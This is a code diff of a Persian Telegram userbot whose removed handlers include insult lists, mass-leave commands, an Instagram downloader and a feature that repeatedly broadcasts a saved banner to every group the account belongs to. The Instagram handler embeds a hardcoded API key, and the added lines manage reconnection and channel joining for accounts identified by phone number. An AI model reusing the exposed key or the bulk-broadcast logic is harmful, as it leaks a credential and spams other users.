-📝 برای استفاده صحیح:
-• روی پیام کاربر ریپلای کنید
-• یا یوزرنیم کاربر را وارد کنید""")
-
-@app.on_message(filters.me & filters.command("حذف ریکت", prefixes=""))
-async def remove_reaction_command(client, message):
-    if message.reply_to_message and message.reply_to_message.from_user:
-        user_id = message.reply_to_message.from_user.id
-        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip()        
-        if str(user_id) in auto_reactions:
-            del auto_reactions[str(user_id)]
-            save_reactions()
-            await message.edit(f"✅ **ریکشن حذف شد**\n\n👤 کاربر: {user_name}\n🆔 آیدی: `{user_id}`")
-        else:
-            await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
-    elif len(message.command) > 1:
-        username = message.command[1].lstrip('@')
-        try:
-            user = await client.get_users(username)
-            user_id = user.id
-            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip()            
-            if str(user_id) in auto_reactions:
-                del auto_reactions[str(user_id)]
-                save_reactions()
-                await message.edit(f"✅ **ریکشن حذف شد**\n\n👤 کاربر: {user_name}\n🆔 آیدی: `{user_id}`")
-            else:
-                await message.edit(f"❌ **ریکشنی برای این کاربر ثبت نشده**")
-        except:
-            await message.edit("❌ **کاربر یافت نشد**\n\nلطفاً روی پیام کاربر ریپلای کنید یا یوزرنیم معتبر وارد کنید")    
-    else:
-        await message.edit("❌ **لطفاً روی پیام کاربر ریپلای کنید یا یوزرنیم وارد کنید**")
-
-@app.on_message(filters.me & filters.command("لیست ریکت", prefixes=""))
-async def list_reactions_command(client, message):
-    if not auto_reactions:
-        await message.edit("❌ **هیچ ریکشنی ثبت نشده**")
-        return    
-    list_text = "📜 **لیست ریکشن‌های خودکار**\n\n"    
-    for user_id, reaction in auto_reactions.items():
-        try:
-            user = await client.get_users(int(user_id))
-            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or "بدون نام"
-            list_text += f"👤 **{user_name}**\n🆔 `{user_id}` → {reaction}\n"
-            list_text += "─" * 30 + "\n"
-        except:
-            list_text += f"👤 کاربر نامشخص\n🆔 `{user_id}` → {reaction}\n"
-            list_text += "─" * 30 + "\n"    
-    list_text += f"\n📊 **تعداد:** {len(auto_reactions)} ریکشن"    
-    await message.edit(list_text)
-
-@app.on_message(filters.me & filters.command("پاکسازی ریکت", prefixes=""))
-async def clear_reactions_command(client, message):
-    if not auto_reactions:
-        await message.edit("❌ **هیچ ریکشنی برای پاکسازی وجود ندارد**")
-        return
-    
-    reaction_count = len(auto_reactions)
-    auto_reactions.clear()
-    save_reactions()
-    
-    await message.edit(f"✅ **لیست ریکشن‌ها پاکسازی شد**\n\n🗑️ **تعداد حذف شده:** {reaction_count} ریکشن")
-
-@app.on_message(filters.me & filters.command("لیست فحش", prefixes=""))
-async def insult_list_command(client: Client, message: Message):
-    insults_list = load_insults()
-    if not insults_list:
-        return await message.edit("❌ **لیست فحش‌ها خالی است**")    
-    try:
-        loading_msg = await message.edit("🔄 **در حال دریافت لیست فحش‌ها...**")        
-        list_text = f"💢 **لیست فحش‌ها - تعداد: {len(insults_list)}**\n\n"        
-        for i, insult in enumerate(insults_list, 1):
-            list_text += f"{i}. {insult}\n"
-            if len(list_text) > 3500:
-                await loading_msg.edit(list_text)
-                list_text = f"💢 **ادامه لیست فحش‌ها**\n\n"
-                loading_msg = await message.reply("🔄 **در حال ادامه لیست...**")
-        
-        if len(list_text) > 0:
-            await loading_msg.edit(list_text)
+            print(f"🔄 بازیابی اتصال برای {self.phone}")
             
-    except Exception as e:
-        await message.edit(f"❌ **خطا در دریافت لیست فحش‌ها:**\n`{e}`")
-
-@app.on_message(filters.me & filters.command("ویرایش", prefixes="") & filters.regex(r"^ویرایش .+ به .+$"))
-async def quick_edit_command(client: Client, message: Message):
-    try:
-        if not message.reply_to_message:
-            await message.edit("❌ **لطفا روی پیامی که می‌خواهید ویرایش کنید ریپلای کنید**")
-            return
-        command_parts = message.text.split()
-        if len(command_parts) != 4:
-            await message.edit("❌ **فرمت نادرست!**\n\n**فرمت صحیح:**\n`ویرایش کلمه_قدیمی به کلمه_جدید`\n\n**مثال:**\n`ویرایش سلان به سلام`")
-            return        
-        old_word = command_parts[1]
-        separator = command_parts[2]
-        new_word = command_parts[3]
-        if separator != "به":
-            await message.edit("❌ **از کلمه 'به' به عنوان جداکننده استفاده کنید**\n\n**مثال:**\n`ویرایش سلان به سلام`")
-            return        
-        replied_message = message.reply_to_message
-        old_text = replied_message.text or replied_message.caption or ""
-        if old_word not in old_text:
-            await message.edit(f"❌ **کلمه '{old_word}' در پیام یافت نشد**")
-            return
-        new_text = old_text.replace(old_word, new_word)
-        await client.edit_message_text(
-            chat_id=replied_message.chat.id,
-            message_id=replied_message.id,
-            text=new_text
-        )
-        await message.delete()        
-    except Exception as e:
-        await message.edit(f"❌ **خطا در ویرایش:**\n`{str(e)}`")
-@app.on_message(filters.me & filters.command("تنظیم بنر", prefixes="") & filters.regex(r"^تنظیم بنر$"))
-async def set_banner_command(client: Client, message: Message):
-    global banner_counter
-    
-    try:
-        if not message.reply_to_message:
-            await message.edit("❌ **لطفا روی پیامی که می‌خواهید به عنوان بنر ثبت کنید ریپلای کنید**")
-            return
-        
-        replied_message = message.reply_to_message
-        banner_id = banner_counter
-        banner_counter += 1
-        banners[banner_id] = {
-            'message': replied_message,
-            'text': replied_message.text or replied_message.caption or "",
-            'media': replied_message.media,
-            'created_at': datetime.now()
-        }
-        
-        await message.edit(f"✅ **بنر با موفقیت ثبت شد**\n\n🆔 **کد بنر:** `{banner_id}`")
-        
-    except Exception as e:
-        await message.edit(f"❌ **خطا در ثبت بنر:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("بنر همگانی", prefixes="") & filters.regex(r"^بنر همگانی \d+$"))
-async def start_broadcast_command(client: Client, message: Message):
-    try:
-        banner_id = int(message.command[1])
-        
-        if banner_id not in banners:
-            await message.edit("❌ **کد بنر یافت نشد**")
-            return
-        active_broadcasts['global'] = {
-            'banner_id': banner_id,
-            'running': True,
-            'start_time': datetime.now()
-        }
-        
-        await message.edit("✅ **بنر همگانی فعال شد**\n\n🔄 ارسال بنر به گروه‌ها و سوپرگروه‌ها شروع شد")
-        asyncio.create_task(send_global_banner(client, banner_id))
-        
-    except Exception as e:
-        await message.edit(f"❌ **خطا در فعال‌سازی بنر:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("لیست بنرها", prefixes="") & filters.regex(r"^لیست بنرها$"))
-async def list_banners_command(client: Client, message: Message):
-    try:
-        if not banners:
-            await message.edit("❌ **هیچ بنری ثبت نشده است**")
-            return
-        
-        list_text = "📋 **لیست بنرها**\n\n"
-        
-        for banner_id, banner_data in banners.items():
-            created_time = banner_data['created_at'].strftime("%Y-%m-%d %H:%M")
-            preview = banner_data['text'][:50] + "..." if len(banner_data['text']) > 50 else banner_data['text']
-            
-            list_text += f"🆔 **کد:** `{banner_id}`\n"
-            list_text += f"📝 **پیش‌نمایش:** {preview}\n"
-            list_text += f"⏰ **زمان ثبت:** {created_time}\n"
-            list_text += "─" * 30 + "\n"
-        
-        await message.edit(list_text)
-        
-    except Exception as e:
-        await message.edit(f"❌ **خطا در نمایش لیست:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("بنر همگانی خاموش", prefixes="") & filters.regex(r"^بنر همگانی خاموش$"))
-async def stop_broadcast_command(client: Client, message: Message):
-    try:
-        if 'global' in active_broadcasts:
-            active_broadcasts['global']['running'] = False
-            await message.edit("✅ **بنر همگانی خاموش شد**")
-        else:
-            await message.edit("❌ **بنر همگانی فعال نیست**")
-            
-    except Exception as e:
-        await message.edit(f"❌ **خطا در خاموش کردن بنر:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("بنر ارسال", prefixes="") & filters.regex(r"^بنر ارسال \d+$"))
-async def instant_broadcast_command(client: Client, message: Message):
-    try:
-        banner_id = int(message.command[1]) 
-        
-        if banner_id not in banners:
-            await message.edit("❌ **کد بنر یافت نشد**")
-            return
-        
-        await message.edit("🔄 **شروع ارسال فوری بنر...**")
-        asyncio.create_task(send_instant_broadcast(client, banner_id))
-        
-    except Exception as e:
-        await message.edit(f"❌ **خطا در ارسال بنر:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("زمان بنر", prefixes="") & filters.regex(r"^زمان بنر \d+$"))
-async def set_banner_time_command(client: Client, message: Message):
-    try:
-        minutes = int(message.command[1]) 
-        active_broadcasts['delay'] = minutes * 60 
-        
-        await message.edit(f"✅ **زمان بنر تنظیم شد:** {minutes} دقیقه")
-        
-    except Exception as e:
-        await message.edit(f"❌ **خطا در تنظیم زمان:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("فرمت", prefixes=""))
-async def format_command(client, message):
-    html_tags = {
-        "بولد": "<b>{}</b>",
-        "ایتالیک": "<i>{}</i>",
-        "زیر خط": "<u>{}</u>",
-        "خط‌ خورده": "<s>{}</s>",
-        "اسپویلر": "<spoiler>{}</spoiler>",
-        "کد": "<code>{}</code>",
-        "پیش‌ فرمت": "<pre>{}</pre>",
-        "نقل‌ قول": "<blockquote>{}</blockquote>",
-    }
-    
-    if len(message.command) < 2:
-        status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
-        
-        for format_name, is_active in format_settings.items():
-            emoji = "🟢" if is_active else "🔴"
-            status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
-        
-        status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
-        
-        await message.edit(f"""
-{status_text}
-
-📝 <b>دستورات فرمت:</b>
-<code>فرمت بولد روشن</code>
-<code>فرمت بولد خاموش</code>
-<code>فرمت ایتالیک روشن</code>
-<code>فرمت ایتالیک خاموش</code>
-<code>فرمت زیر خط روشن</code>
-<code>فرمت زیر خط خاموش</code>
-<code>فرمت خط‌ خورده روشن</code>
-<code>فرمت خط‌ خورده خاموش</code>
-<code>فرمت اسپویلر روشن</code>
-<code>فرمت اسپویلر خاموش</code>
-<code>فرمت کد روشن</code>
-<code>فرمت کد خاموش</code>
-<code>فرمت پیش‌ فرمت روشن</code>
-<code>فرمت پیش‌ فرمت خاموش</code>
-<code>فرمت نقل‌ قول روشن</code>
-<code>فرمت نقل‌ قول خاموش</code>
-
-🔧 <b>سایر دستورات:</b>
-<code>فرمت وضعیت</code> - نمایش وضعیت
-<code>فرمت ریست</code> - غیرفعال کردن همه
-""", parse_mode=enums.ParseMode.HTML)
-        return
-    if len(message.command) == 2:
-        sub_command = message.command[1]        
-        if sub_command == "وضعیت":
-            status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
-            
-            for format_name, is_active in format_settings.items():
-                emoji = "🟢" if is_active else "🔴"
-                status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
-            
-            status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
-            await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
-            return            
-        elif sub_command == "ریست":
-            for format_name in format_settings:
-                format_settings[format_name] = False
-            await message.edit("✅ <b>همه فرمت‌ها غیرفعال شدند</b>", parse_mode=enums.ParseMode.HTML)
-            return
-    if len(message.command) == 3:
-        format_name = message.command[1]
-        action = message.command[2]        
-        if format_name in format_settings:
-            if action == "روشن":
-                format_settings[format_name] = True
-                sample_text = html_tags[format_name].format("این یک متن نمونه است")
-                await message.edit(f"✅ <b>فرمت {format_name} فعال شد</b>\n\n📝 <b>نمونه:</b> {sample_text}", parse_mode=enums.ParseMode.HTML)                
-            elif action == "خاموش":
-                format_settings[format_name] = False
-                await message.edit(f"✅ <b>فرمت {format_name} غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)                
-            else:
-                await message.edit("❌ <b>دستور نامعتبر</b>\n\n💡 از <code>روشن</code> یا <code>خاموش</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
-        else:
-            await message.edit(f"❌ <b>فرمت نامعتبر</b>\n\n💡 فرمت‌های معتبر: {', '.join(format_settings.keys())}", parse_mode=enums.ParseMode.HTML)
-    else:
-        await message.edit("❌ <b>فرمت دستور نادرست</b>\n\n💡 از <code>فرمت</code> برای مشاهده راهنما استفاده کنید", parse_mode=enums.ParseMode.HTML)
-
-@app.on_message(filters.me & filters.command("تعداد کانال ها", prefixes=""))
-async def channels_count_command(client: Client, message: Message):
-    """نمایش تعداد دقیق کانال‌ها"""
-    try:
-        loading_msg = await message.edit("**📊 در حال شمارش کانال‌ها...**")
-        
-        channels_count = 0
-        channels_list = []
-        
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type == enums.ChatType.CHANNEL:
-                channels_count += 1
-                channels_list.append(dialog.chat.title)
-        
-        result_text = f"""**📈 آمار کانال‌ها**
-
-📊 **تعداد کل کانال‌ها:** `{channels_count}`
-        
-📋 **لیست کانال‌ها:**
-"""
-        for i, channel in enumerate(channels_list[:20], 1):
-            result_text += f"{i}. {channel}\n"
-        
-        if len(channels_list) > 20:
-            result_text += f"\n📝 و {len(channels_list) - 20} کانال دیگر..."
-        
-        await loading_msg.edit(result_text)
-        
-    except Exception as e:
-        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("تعداد گروه ها", prefixes=""))
-async def groups_count_command(client: Client, message: Message):
-    """نمایش تعداد دقیق گروه‌ها"""
-    try:
-        loading_msg = await message.edit("**📊 در حال شمارش گروه‌ها...**")
-        
-        groups_count = 0
-        supergroups_count = 0
-        groups_list = []
-        
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type == enums.ChatType.GROUP:
-                groups_count += 1
-                groups_list.append(f"👥 {dialog.chat.title}")
-            elif dialog.chat.type == enums.ChatType.SUPERGROUP:
-                supergroups_count += 1
-                groups_list.append(f"👑 {dialog.chat.title}")
-        
-        total_groups = groups_count + supergroups_count
-        
-        result_text = f"""**📈 آمار گروه‌ها**
-
-📊 **تعداد کل گروه‌ها:** `{total_groups}`
-• گروه‌های معمولی: `{groups_count}`
-• سوپرگروه‌ها: `{supergroups_count}`
-
-📋 **لیست گروه‌ها:**
-"""
-        for i, group in enumerate(groups_list[:20], 1):
-            result_text += f"{i}. {group}\n"
-        
-        if len(groups_list) > 20:
-            result_text += f"\n📝 و {len(groups_list) - 20} گروه دیگر..."
-        
-        await loading_msg.edit(result_text)
-        
-    except Exception as e:
-        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("خروج همه کانال", prefixes=""))
-async def leave_all_channels_command(client: Client, message: Message):
-    """خروج از تمام کانال‌ها با تاخیر"""
-    try:
-        loading_msg = await message.edit("**🔄 در حال دریافت لیست کانال‌ها...**")
-        
-        channels = []
-        
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type == enums.ChatType.CHANNEL:
-                channels.append(dialog.chat)
-        
-        if not channels:
-            return await loading_msg.edit("**❌ هیچ کانالی برای خروج پیدا نشد**")
-        
-        await loading_msg.edit(f"**🚪 در حال خروج از {len(channels)} کانال...**")
-        
-        success_count = 0
-        failed_count = 0
-        
-        for i, channel in enumerate(channels, 1):
-            try:
-                await client.leave_chat(channel.id)
-                success_count += 1
-                await asyncio.sleep(4)
-                
-                if i % 5 == 0:
-                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(channels)}")
-                    
-            except Exception as e:
-                failed_count += 1
-                print(f"خطا در خروج از {channel.title}: {e}")
-        
-        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**
-
-📊 **نتایج:**
-• ✅ موفق: `{success_count}`
-• ❌ ناموفق: `{failed_count}`
-• 📊 کل کانال‌ها: `{len(channels)}`""")
-        
-    except Exception as e:
-        await message.edit(f"**❌ خطا:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("خروج همه گروه", prefixes=""))
-async def leave_all_groups_command(client: Client, message: Message):
-    """خروج از تمام گروه‌ها با تاخیر"""
-    try:
-        loading_msg = await message.edit("**🔄 در حال دریافت لیست گروه‌ها...**")
-        
-        groups = []
-        
-        async for dialog in client.get_dialogs():
-            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
-                groups.append(dialog.chat)
-        
-        if not groups:
-            return await loading_msg.edit("**❌ هیچ گروهی برای خروج پیدا نشد**")
-        
-        await loading_msg.edit(f"**🚪 در حال خروج از {len(groups)} گروه...**")
-        
-        success_count = 0
-        failed_count = 0
-        
-        for i, group in enumerate(groups, 1):
-            try:
-                await client.leave_chat(group.id)
-                success_count += 1
-                await asyncio.sleep(4)
-                
-                if i % 3 == 0:
-                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(groups)}")
-                    
-            except Exception as e:
-                failed_count += 1
-                print(f"خطا در خروج از {group.title}: {e}")
-        
-        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**
-
-📊 **نتایج:**
-• ✅ موفق: `{success_count}`
-• ❌ ناموفق: `{failed_count}`
-• 📊 کل گروه‌ها: `{len(groups)}`""")
-        
-    except Exception as e:
-        await message.edit(f"**❌ خطا:**\n`{str(e)}`")
-
-@app.on_message(filters.me & filters.command("اکشن", prefixes=""))
-async def action_command(client: Client, message: Message):
-    if len(message.command) == 1:
-        active_actions = [name for name, status in action_settings.items() if status]
-        
-        actions_text = """🎭 <b>سیستم اکشن خودکار</b>
-📊 <b>وضعیت فعلی:</b>
-"""
-        if active_actions:
-            actions_text += f"✅ <b>فعال:</b> {', '.join([get_persian_action_name(name) for name in active_actions])}\n"
-        else:
-            actions_text += "❌ <b>هیچ اکشنی فعال نیست</b>\n"
-        
-        actions_text += """
-🔧 <b>دستورات:</b>
-<code>اکشن لیست</code> - نمایش لیست کامل اکشن‌ها
-<code>اکشن [نام] روشن</code> - فعال کردن اکشن
-<code>اکشن [نام] خاموش</code> - غیرفعال کردن اکشن
-<code>اکشن وضعیت</code> - نمایش وضعیت دقیق
-<code>اکشن ریست</code> - خاموش کردن همه اکشن‌ها
-
-📝 <b>مثال:</b>
-<code>اکشن تایپ روشن</code>
-<code>اکشن اپلود فایل خاموش</code>
-<code>اکشن وضعیت</code>
-"""
-        await message.edit(actions_text, parse_mode=enums.ParseMode.HTML)
-        return
-    
-    sub_command = message.command[1]
-    
-    if sub_command == "لیست":
-        actions_list = """🎭 <b>لیست کامل اکشن‌های تلگرام</b>
-
-📝 <b>اکشن‌های متنی (نمایش به کاربر):</b>
-• تایپ - ⌨️ در حال تایپ (Typing...)
-• اپلود عکس - 📸 در حال آپلود عکس (Uploading photo...)
-• ضبط ویس - 🎤 در حال ضبط ویس (Recording voice...)
-• اپلود ویدیو - 🎥 در حال آپلود ویدیو (Uploading video...)
-• اپلود فایل - 📄 در حال آپلود فایل (Uploading document...)
-• ضبط ویدیو - 🎬 در حال ضبط ویدیو (Recording video...)
-• اپلود ویس - 🎵 در حال آپلود ویس (Uploading voice...)
-• اپلود ویدیو نوت - 📹 در حال آپلود ویدیو نوت (Uploading video note...)
-• ضبط ویدیو نوت - 🎞️ در حال ضبط ویدیو نوت (Recording video note...)
-• بازی - 🎮 در حال بازی (Playing...)
-• انتخاب مخاطب - 👤 در حال انتخاب مخاطب (Choosing contact...)
-• پیدا کردن موقعیت - 📍 در حال پیدا کردن موقعیت (Finding location...)
-• انتخاب استیکر - 🎨 در حال انتخاب استیکر (Choosing sticker...)
-
-💡 <b>نکته:</b>
-وقتی کاربر پیام می‌فرستد، اکشن فعال نمایش داده می‌شود
-اکشن‌ها در پیوی و گروه کار می‌کنند"""
-        await message.edit(actions_list, parse_mode=enums.ParseMode.HTML)
-    
-    elif sub_command == "وضعیت":
-        status_text = "📊 <b>وضعیت دقیق اکشن‌ها</b>\n\n"
-        
-        for action_name, is_active in action_settings.items():
-            emoji = "🟢" if is_active else "🔴"
-            persian_name = get_persian_action_name(action_name)
-            status_text += f"{emoji} <b>{persian_name}</b>: {'فعال ✅' if is_active else 'غیرفعال ❌'}\n"
-        
-        active_count = sum(action_settings.values())
-        status_text += f"\n📈 <b>آمار:</b> {active_count} از {len(action_settings)} اکشن فعال"
-        
-        await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
-    
-    elif sub_command == "ریست":
-        for key in action_settings:
-            action_settings[key] = False
-        
-        await message.edit("✅ <b>همه اکشن‌ها خاموش شدند</b>", parse_mode=enums.ParseMode.HTML)    
-    else:
-        full_text = ' '.join(message.command[1:])
-        if " روشن" in full_text:
-            action_name_persian = full_text.replace(" روشن", "").strip()
-            action_state = "روشن"
-        elif " خاموش" in full_text:
-            action_name_persian = full_text.replace(" خاموش", "").strip()
-            action_state = "خاموش"
-        else:
-            await message.edit("❌ <b>فرمت دستور نادرست است</b>\n\nمثال: <code>اکشن اپلود عکس روشن</code>", parse_mode=enums.ParseMode.HTML)
-            return
-        action_name = get_english_action_name(action_name_persian)        
-        if action_name not in action_settings:
-            await message.edit(f"❌ <b>اکشن '{action_name_persian}' یافت نشد</b>\n\n📝 از دستور <code>اکشن لیست</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
-            return
-        
-        if action_state == "روشن":
-            action_settings[action_name] = True
-            persian_name = get_persian_action_name(action_name)
-            await message.edit(f"✅ <b>اکشن '{persian_name}' فعال شد</b>\n\nاز این به بعد وقتی کاربران پیام می‌فرستند، اکشن '{persian_name}' نمایش داده می‌شود.", parse_mode=enums.ParseMode.HTML)
-        
-        elif action_state == "خاموش":
-            action_settings[action_name] = False
-            persian_name = get_persian_action_name(action_name)
-            await message.edit(f"✅ <b>اکشن '{persian_name}' غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)
-
-@app.on_message(filters.me & filters.command("اینستا", prefixes=""))
-async def instagram_download_command(client: Client, message: Message):
-    """دانلود پست‌های اینستاگرام (ریل و پست عادی)"""
-    try:
-        if len(message.command) < 2:
-            await message.edit("""
-📥 **دستور دانلود اینستاگرام**
-
-📝 **استفاده:**
-`اینستا [لینک پست یا ریل]`
-
-📌 **مثال‌ها:**
-
-`اینستا https://www.instagram.com/reel/DOkym3fCFqg/`
-
-`اینستا https://www.instagram.com/p/CzuF4KQqJ7q/`
-
-""")
-            return        
-        url = message.command[1].strip()
-        if not url.startswith(("https://www.instagram.com/", "https://instagram.com/")):
-            await message.edit("❌ **لینک نامعتبر!**\nلطفا لینک معتبر اینستاگرام وارد کنید.")
-            return
-        if "/stories/" in url or "/story/" in url:
-            await message.edit("❌ **این دستور فقط برای پست‌ها و ریل‌ها کار می‌کند!**\nلینک استوری پشتیبانی نمی‌شود.")
-            return        
-        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
-        api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBot"
-        api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={url}"        
-        try:
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-            import urllib.parse
-            encoded_url = urllib.parse.quote(url, safe='')
-            final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"            
-            response = requests.get(final_api_url, headers=headers, timeout=45)
-            print(f"Status Code: {response.status_code}")
-            print(f"Response: {response.text[:500]}")
-            if response.status_code != 200:
-                await loading_msg.edit(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status_code}")
-                return
-            try:
-                data = response.json()
-            except json.JSONDecodeError as e:
-                await loading_msg.edit(f"❌ **پاسخ JSON نامعتبر**\n{str(e)}")
-                return
-            if not data.get("ok", False):
-                error_msg = data.get("status", "خطای نامشخص")
-                await loading_msg.edit(f"❌ **خطا از سمت API**\n{error_msg}")
-                return
-            if "result" not in data:
-                await loading_msg.edit("❌ **پاسخ نامعتبر از سرور**\nفیلد 'result' یافت نشد")
-                return
-            
-            result = data.get("result", {})
-            
-            if result.get("status") != "success":
-                error_detail = result.get("message", "پست یافت نشد")
-                await loading_msg.edit(f"❌ **خطا:** {error_detail}")
-                return
-            posts = result.get("result", [])
-            
-            if not posts:
-                await loading_msg.edit("❌ **هیچ محتوایی در این پست یافت نشد**")
-                return
-            post = posts[0]
-            post_id = post.get('id', 'نامشخص')
-            username = post.get('username', 'نامشخص')
-            caption = post.get('caption', 'بدون توضیح')
-            is_video = post.get('is_video', False)
-            thumbnail_url = post.get('video_img', '')
-            caption_text = f"""
-📸 **اینستاگرام دانلودر**
-
-👤 **صاحب پست:** @{username}
-🆔 **آیدی پست:** `{post_id}`
-
-📝 **توضیحات:**
-{caption[:500]}{'...' if len(caption) > 500 else ''}
-
-#دانلود_اینستاگرام
-"""
-            thumbnail_path = None
-            if thumbnail_url:
+            if self.client:
                 try:
-                    thumb_response = requests.get(thumbnail_url, timeout=15)
-                    if thumb_response.status_code == 200:
-                        thumbnail_path = f"temp_thumb_{post_id}.jpg"
-                        with open(thumbnail_path, 'wb') as f:
-                            f.write(thumb_response.content)
+                    await self.client.disconnect()
                 except:
-                    thumbnail_path = None
-            if is_video:
-                video_url = post.get('video_url')
-                
-                if not video_url:
-                    await loading_msg.edit("❌ **لینک ویدیو یافت نشد**")
-                    if thumbnail_path and os.path.exists(thumbnail_path):
-                        os.remove(thumbnail_path)
-                    return                
-                await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")                
-                try:
-                    video_response = requests.get(video_url, timeout=60)
-                    
-                    if video_response.status_code != 200:
-                        await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
-                        if thumbnail_path and os.path.exists(thumbnail_path):
-                            os.remove(thumbnail_path)
-                        return
-                    temp_file = f"temp_insta_{post_id}.mp4"
-                    with open(temp_file, 'wb') as f:
-                        f.write(video_response.content)
-                    file_size = os.path.getsize(temp_file)
-                    if file_size == 0:
-                        await loading_msg.edit("❌ **فایل ویدیو خالی است**")
-                        os.remove(temp_file)
-                        if thumbnail_path and os.path.exists(thumbnail_path):
-                            os.remove(thumbnail_path)
-                        return                    
-                    await loading_msg.edit("📤 **در حال آپلود ویدیو...**")                    
-                    try:
-                        await client.send_video(
-                            chat_id=message.chat.id,
-                            video=temp_file,
-                            caption=caption_text,
-                            thumb=thumbnail_path if thumbnail_path else None,
-                            supports_streaming=True,
-                            reply_to_message_id=message.id
-                        )
-                    except Exception as upload_error:
-                        await loading_msg.edit(f"❌ **خطا در آپلود:**\n`{str(upload_error)[:100]}`")
-                    if os.path.exists(temp_file):
-                        os.remove(temp_file)
-                    if thumbnail_path and os.path.exists(thumbnail_path):
-                        os.remove(thumbnail_path)
-                    
-                    await loading_msg.delete()
-                    
-                except Exception as e:
-                    await loading_msg.edit(f"❌ **خطا در پردازش ویدیو:**\n`{str(e)[:100]}`")
-                    for temp_file in [f"temp_insta_{post_id}.mp4", f"temp_thumb_{post_id}.jpg"]:
-                        if os.path.exists(temp_file):
-                            os.remove(temp_file)
+                    pass
+            
+            wait_time = random.uniform(5, 15)
+            await asyncio.sleep(wait_time)
+            
+            if await self.safe_initialize_client():
+                print(f"✅ اتصال {self.phone} بازیابی شد")
+                return True
             else:
-                media_url = thumbnail_url
+                print(f"❌ بازیابی اتصال {self.phone} ناموفق بود")
+                return False
                 
-                if not media_url:
-                    await loading_msg.edit("❌ **لینک عکس یافت نشد**")
-                    return                
-                await loading_msg.edit("🖼️ **در حال دانلود عکس...**")                
-                try:
-                    image_response = requests.get(media_url, timeout=30)
-                    
-                    if image_response.status_code != 200:
-                        await loading_msg.edit("❌ **خطا در دانلود عکس**")
-                        return
-                    temp_file = f"temp_insta_{post_id}.jpg"
-                    with open(temp_file, 'wb') as f:
-                        f.write(image_response.content)                    
-                    await loading_msg.edit("📤 **در حال آپلود عکس...**")                    
-                    try:
-                        await client.send_photo(
-                            chat_id=message.chat.id,
-                            photo=temp_file,
-                            caption=caption_text,
-                            reply_to_message_id=message.id
-                        )
-                    except Exception as upload_error:
-                        await loading_msg.edit(f"❌ **خطا در آپلود عکس:**\n`{str(upload_error)[:100]}`")
-                    if os.path.exists(temp_file):
-                        os.remove(temp_file)                    
-                    await loading_msg.delete()                    
-                except Exception as e:
-                    await loading_msg.edit(f"❌ **خطا در پردازش عکس:**\n`{str(e)[:100]}`")
-                    if os.path.exists(f"temp_insta_{post_id}.jpg"):
-                        os.remove(f"temp_insta_{post_id}.jpg")                    
-        except requests.exceptions.Timeout:
-            await loading_msg.edit("❌ **اتصال timeout شد**\nسرور پاسخ نداد.")
-        except requests.exceptions.ConnectionError:
-            await loading_msg.edit("❌ **خطا در اتصال**\nاینترنت خود را بررسی کنید.")
         except Exception as e:
-            await loading_msg.edit(f"❌ **خطای غیرمنتظره:**\n`{str(e)[:150]}`")
-            
-    except Exception as e:
-        await message.edit(f"❌ **خطای کلی:**\n`{str(e)[:150]}`")
+            print(f"❌ خطا در بازیابی اتصال {self.phone}: {e}")
+            return False
 
-@app.on_message(filters.me & filters.command("پینگ", prefixes=""))
-async def ping_command(client: Client, message: Message):
-    """بررسی سرعت ربات"""
-    start_time = datetime.now()
-    ping_msg = await message.edit("**⏳ در حال بررسی...**")
-    end_time = datetime.now()
-    
-    ping_time = (end_time - start_time).microseconds / 1000
-    await ping_msg.edit(f"**🏓 پونگ!**\n**⏱ سرعت: {ping_time:.2f} ms**")
-@app.on_message(filters.me & filters.command(["پنل", "panel"], prefixes=""))
-async def panel_command(client, message: Message):
-        results = await client.get_inline_bot_results(bot_username, "panel")
+    async def safe_join_channels(self):
+        """عضویت ایمن در کانال‌ها"""
